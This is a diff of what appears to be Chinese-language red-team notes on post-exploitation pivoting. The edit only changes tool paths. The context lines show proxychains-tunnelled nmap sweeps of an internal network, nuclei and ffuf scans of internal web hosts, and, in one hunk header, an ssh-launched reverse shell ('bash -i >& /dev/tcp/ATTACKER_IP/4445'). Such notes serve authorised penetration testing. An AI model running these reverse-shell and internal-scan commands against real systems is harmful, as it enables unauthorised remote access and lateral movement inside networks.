@@ -32,7 +32,7 @@ proxychains nmap -sT -Pn --open -p 22,80,443,445,3389,3306,8080 INTERNAL_CIDR -o
 proxychains nmap -sT -sV -Pn -p- --open INTERNAL_HOST
 
 # Web 资产
-proxychains /root/go/bin/httpx -l /tmp/internal_hosts.txt -sc -title -td -silent -t 50
+proxychains httpx -l /tmp/internal_hosts.txt -sc -title -td -silent -t 50
 ```
 
 ---
@@ -96,12 +96,12 @@ proxychains ssh user@INTERNAL_HOST "bash -i >& /dev/tcp/ATTACKER_IP/4445 0>&1 &"
 
 ```bash
 # nuclei 扫描内网 web
-proxychains /root/go/bin/nuclei -u http://INTERNAL_HOST \
-  -t /root/nuclei-templates/ \
+proxychains nuclei -u http://INTERNAL_HOST \
+  -t ~/nuclei-templates/ \
   -c 50 -rl 100 -timeout 60 -silent
 
 # ffuf 目录枚举
-proxychains /root/go/bin/ffuf -u http://INTERNAL_HOST/FUZZ \
+proxychains ffuf -u http://INTERNAL_HOST/FUZZ \
   -w /opt/wordlists/seclists/Discovery/Web-Content/common.txt \
   -t 50 -mc 200,301,302,403
 
